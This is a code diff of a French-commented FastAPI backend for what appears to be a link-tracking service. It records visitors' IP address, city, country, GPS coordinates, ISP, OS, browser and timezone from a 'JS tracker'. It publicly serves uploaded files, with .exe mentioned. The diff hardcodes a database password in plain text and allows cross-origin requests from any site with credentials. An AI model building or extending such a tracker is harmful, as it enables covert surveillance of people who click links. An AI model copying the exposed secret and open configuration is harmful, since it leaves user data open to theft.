@@ -1,8 +1,7 @@
 from fastapi import FastAPI, UploadFile, File, HTTPException
 from fastapi.responses import JSONResponse
 from fastapi.staticfiles import StaticFiles
-from fastapi.middleware.cors import CORSMiddleware  # CORS
-
+from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import os
 import shutil
@@ -12,10 +11,10 @@ from psycopg2.extras import RealDictCursor
 # === CONFIGURATION DE L'APPLICATION ===
 app = FastAPI()
 
-# ✅ Autoriser les requêtes cross-origin (CORS)
+# ✅ Autoriser les requêtes Cross-Origin (ex: depuis Netlify)
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # Remplace par ["https://trackerethique.netlify.app"] pour + de sécurité
+    allow_origins=["*"],  # Ou ["https://trackerethique.netlify.app"] pour plus de sécurité
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -24,18 +23,20 @@ app.add_middleware(
 # === CONFIG UPLOAD FICHIERS ===
 UPLOAD_DIR = os.path.abspath("uploaded_files")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
-BASE_URL = os.getenv("BASE_URL", "postgresql://postgre:kSdrZm4De8otlWEQTPGe76EyAweHieoN@dpg-d1e12ofdiees73c2sfu0-a/tracksys_bd")
+
+# ✅ URL du backend (Render)
+BASE_URL = os.getenv("BASE_URL", "https://tracksys-backend.onrender.com")
 
 # === CONFIGURATION DE LA BASE POSTGRESQL ===
 DB_CONFIG = {
-    "host": "dpg-d1e12ofdiees73c2sfu0-a",  # Remplace par ton host réel Render
+    "host": "dpg-d1e12ofdiees73c2sfu0-a",         # ton host Render PostgreSQL
     "dbname": "tracksys_bd",
-    "user": "postgre",
-    "password": "kSdrZm4De8otlWEQTPGe76EyAweHieoN",  # Remplace avec précaution
+    "user": "postgres",                           # ✅ corrigé ici
+    "password": "kSdrZm4De8otlWEQTPGe76EyAweHieoN",  # ⚠ À sécuriser dans une variable d’environnement plus tard
     "port": 5432
 }
 
-# === ROUTE POUR L’UPLOAD DE FICHIERS ===
+# === ROUTE POUR L’UPLOAD DE FICHIERS (ex: .zip/.exe) ===
 @app.post("/upload/")
 async def upload_file(file: UploadFile = File(...)):
     try:
@@ -51,10 +52,10 @@ async def upload_file(file: UploadFile = File(...)):
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-# === RENDRE LES FICHIERS ACCESSIBLES EN PUBLIC ===
+# === SERVIR LES FICHIERS STATIQUES ===
 app.mount("/files", StaticFiles(directory=UPLOAD_DIR), name="files")
 
-# === ROUTE DE RÉCEPTION DES DONNÉES COLLECTÉES PAR FORM.HTML ===
+# === MODÈLE POUR LES DONNÉES COLLECTÉES ===
 class CollecteData(BaseModel):
     ip: str
     ville: str
@@ -68,8 +69,9 @@ class CollecteData(BaseModel):
     resolution: str
     fuseau: str
     date: str
-    image_vue: str = None  # Peut être null (lien simple)
+    image_vue: str = None  # Null pour lien simple
 
+# === ROUTE DE COLLECTE DES DONNÉES (FormSubmit ou JS tracker) ===
 @app.post("/collecte")
 async def collecter_infos(data: CollecteData):
     try:
@@ -82,7 +84,7 @@ async def collecter_infos(data: CollecteData):
                 fai, os, navigateur, resolution, fuseau, date_collecte, image_vue
             ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
         """, (
-            1,  # Remplacer par le vrai ID du lien si dispo
+            1,  # Tu peux remplacer 1 par l’ID réel si besoin
             data.ip, data.ville, data.region, data.pays,
             data.latitude, data.longitude, data.fai,
             data.os, data.navigateur, data.resolution,
